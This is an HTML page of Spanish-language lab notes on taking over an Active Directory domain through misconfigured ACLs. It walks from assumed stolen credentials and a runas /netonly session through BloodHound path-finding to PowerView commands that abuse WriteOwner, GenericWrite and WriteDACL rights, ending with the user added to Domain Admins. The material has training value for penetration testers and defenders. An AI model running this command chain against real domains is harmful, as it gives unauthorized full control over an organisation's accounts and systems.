<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Explotación ACLs vulnerables</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Explotación ACLs vulnerables</h1><br/><p><h1>ANALISIS</h1></p><p></p><p>En la pestaña de análisis en BloodHound : Find shortest path to domain admins.</p><p></p><p>En este caso vamos a seguir la ruta desde un usuario llamado </p><p><img src="images/23-1.png" alt="images/23-1.png" /></p><p></p><p>Que es miembro de Accounting</p><p></p><p><img src="images/23-2.png" alt="images/23-2.png" /></p><p></p><p>Vamos a suponer que hemos vulnerado sus credenciales.</p><p></p><p>De acuerdo, suponiendo que tenemos sus credenciales MARLEEN.JULIA/Julia desde la WS01 vamos a realizar acciones en su nombre:</p><p></p><p><img src="images/23-3.png" alt="images/23-3.png" /></p><p></p><p>En una interfaz gráfica simplemente hacemos click derecho en powershell, luego shift+click derecho y ejecutar como otro usuario.</p><p></p><p>Sin acceso a interfaz gráfica, desde una powershell ya activa desde empleado1:</p><p></p><p><div class="codebox"><pre><br />runas <span style="color:#000000;font-weight:700">/</span>user<span style="color:#000000;font-weight:700">:</span>corp<span style="color:#000000;font-weight:700">\</span>marleen.julia powershell<br />Julia<br /></pre></div></p><p></p><p><img src="images/23-4.png" alt="images/23-4.png" /></p><p></p><p>Y como vemos se nos abrirá un powershell desde el usuario del dominio objetivo.</p><p></p><p>Para poder además trabajar con el powerview del que disponemos en empleado 1 añadimos lo siguiente al comando de ejecución:</p><p></p><p><div class="codebox"><pre><br />runas <span style="color:#000000;font-weight:700">/</span>user<span style="color:#000000;font-weight:700">:</span>corp<span style="color:#000000;font-weight:700">\</span>marleen.julia <span style="color:#000000;font-weight:700">/</span>netonly powershell</pre></div></p><p></p><p>Esto provoca que tengamos el token del usuario empleado1 de manera local pero autenticarse a nivel de red tenemos el token de Marleen.Julia.</p><p></p><p><img src="images/23-5.png" alt="images/23-5.png" /></p><p></p><p>Y como vemos tenemos disponibles todos los archivos del usuario local.</p><p></p><p>En este caso vamos a explotar la vulnerabilidad del permiso WRITEOWNER que dispon el grupo ACCOUNING del que forma parte Marleen.Julia para así poder agregarnos al grupo PROJECT.MANAGEMENT</p><p></p><p><img src="images/23-6.png" alt="images/23-6.png" /></p><p></p><p><strong>WriteOwner</strong> es un privilegio que permite a los miembros del grupo ACCOUNTING modificar el owner o propietario del grupo PROJECT MANAGEMENT.</p><p>Lo que esto implica es que al modificar el owner del grupo y lo ponemos como el usuario Julia, tendremos la capacidad de modificar todo el DACL y, debido a esto podemos introducir una ACE que nos permita con el usuario Julia añadir miembros a ese grupo PROJECT MANAGEMENT y añadrinos a nosotros mismos.</p><p></p><p>Si en BloodHound hacemos click derecho sobre WriteOwner podremos obtener información sobre las vulnerabilidades.</p><p></p><p><img src="images/23-7.png" alt="images/23-7.png" /></p><p></p><p></p><p>Ejecutamos powerview con el powershell de Julia.</p><p></p><p><div class="codebox"><pre><br />. .<span style="color:#000000;font-weight:700">\</span>powerview.ps1</pre></div></p><p></p><p><div class="codebox"><pre><br /><span style="color:#729fcf;font-weight:400">Set</span><span style="color:#000000;font-weight:700">-</span>DomainObjectOwner <span style="color:#000000;font-weight:700">-</span>Identity <span style="color:#edd400;font-weight:400">&quot;Project management&quot;</span> <span style="color:#000000;font-weight:700">-</span>OwnerIdentity marleen.julia</pre></div></p><p></p><p>Ahora simplemente por verificar y para ver que funciona correctamente vemos que en el administrador del dominio, en las propiedades de seguridad avanzadas del grupo Project Management el dueño es Marleen.Julia:</p><p></p><p><img src="images/23-8.png" alt="images/23-8.png" /></p><p></p><p>Ahora lo que queremos es añadir una ACL que permita añadir miembros al usuario de Julia:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#edd400;font-weight:400">Add-DomainObjectAcl</span> <span style="color:#000000;font-weight:700">-</span>TargetIdentity <span style="color:#edd400;font-weight:400">&quot;Project management&quot;</span> <span style="color:#000000;font-weight:700">-</span>Rights WriteMembers <span style="color:#000000;font-weight:700">-</span>PrincipalIdentity marleen.julia </pre></div></p><p></p><p>Ahora si volvemos a comprobar el administrador del dominio vemos que se ha añadido una entrada nueva a nombre del usuario de Julia:</p><p></p><p><img src="images/23-9.png" alt="images/23-9.png" /></p><p></p><p>Esta nos permite agregar miembros al grupo de ProjectManagement.</p><p></p><p><div class="codebox"><pre><br /><span style="color:#edd400;font-weight:400">Add-DomainGroupMember</span> <span style="color:#000000;font-weight:700">-</span>Identity <span style="color:#ce5c00;font-weight:400">&#39;Project management&#39;</span> <span style="color:#000000;font-weight:700">-</span>Members <span style="color:#ce5c00;font-weight:400">&#39;marleen.julia&#39;</span></pre></div></p><p></p><p><img src="images/23-10.png" alt="images/23-10.png" /><img src="images/23-11.png" alt="images/23-11.png" /></p><p></p><p>Observamos como ahora Julia es miembro de ProjectManagement.</p><p></p><p>Ahora podemos aprovechar que somos del grupo para explotar el GenericWrite que tenemos sobre el grupo Executives:</p><p></p><p><img src="images/23-12.png" alt="images/23-12.png" /></p><p></p><p><h3>Apunte importante: ES NECESARIO VOLVER A LOGGEAR CON LA CUENTA DE JULIA PARA ACTUALIZAR LOS PERMISOS!</h3></p><p></p><p><div class="codebox"><pre><br /><span style="color:#edd400;font-weight:400">Add-DomainGroupMember</span> <span style="color:#000000;font-weight:700">-</span>Identity <span style="color:#ce5c00;font-weight:400">&#39;Executives&#39;</span> <span style="color:#000000;font-weight:700">-</span>Members <span style="color:#ce5c00;font-weight:400">&#39;marleen.julia&#39;</span></pre></div></p><p></p><p><img src="images/23-13.png" alt="images/23-13.png" /></p><p></p><p><img src="images/23-14.png" alt="images/23-14.png" /></p><p></p><p>Ahora por extensión somos miembros de Executives que a su vez es miembro de OfficeAdmin que a su vez es miembro de administradores de empresas.</p><p></p><p><img src="images/23-15.png" alt="images/23-15.png" /></p><p></p><p>Esto implica que ahora podremos abusar de WriteDACL para escribir uno nuevo dentro de admins del dominio para permitir al usuario de Julia añadir miembros y auto añadirse a administradores del dominio.</p><p></p><p>En este caso como no necesitamos ser dueños sino que el propio grupo dispone de ese permiso de WriteDacl simplemente:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#edd400;font-weight:400">Add-DomainObjectAcl</span> <span style="color:#000000;font-weight:700">-</span>TargetIdentity <span style="color:#edd400;font-weight:400">&quot;Admins. del dominio&quot;</span> <span style="color:#000000;font-weight:700">-</span>Rights WriteMembers <span style="color:#000000;font-weight:700">-</span>PrincipalIdentity marleen.julia </pre></div></p><p></p><p><img src="images/23-16.png" alt="images/23-16.png" /></p><p><img src="images/23-17.png" alt="images/23-17.png" /></p><p></p><p>Nos añadimos como miembro</p><p></p><p><div class="codebox"><pre><br /><span style="color:#edd400;font-weight:400">Add-DomainGroupMember</span> <span style="color:#000000;font-weight:700">-</span>Identity <span style="color:#ce5c00;font-weight:400">&#39;Admins. del dominio&#39;</span> <span style="color:#000000;font-weight:700">-</span>Members <span style="color:#ce5c00;font-weight:400">&#39;marleen.julia&#39;</span></pre></div></p><p></p><p><img src="images/23-18.png" alt="images/23-18.png" /></p><p></p><p>Reiniciamos la sesión.</p><p></p><p><img src="images/23-19.png" alt="images/23-19.png" /></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
